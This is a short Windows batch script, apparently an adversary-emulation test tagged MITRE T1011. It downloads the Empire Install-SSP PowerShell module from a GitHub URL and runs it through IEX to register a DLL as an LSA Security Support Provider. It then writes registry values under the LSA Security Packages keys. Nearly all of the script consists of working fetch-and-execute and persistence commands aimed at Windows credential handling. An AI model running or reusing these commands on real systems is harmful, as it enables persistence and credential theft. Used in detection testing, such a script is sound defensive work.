@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Exfiltration Over Other Network Medium (T1011)
ECHO.
ECHO [+] Security Support Provider (SSP) added to LSA configuration
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/Empire/master/data/module_source/persistence/Install-SSP.ps1'); $m = Install-SSP -Path %Utilities%Dll1_64.dll; $m
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages" /t REG_EXPAND_SZ /v T1011 /d calc.exe /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\OSConfig\Security Packages" /t REG_EXPAND_SZ /v T1011 /d calc.exe /f
ECHO.

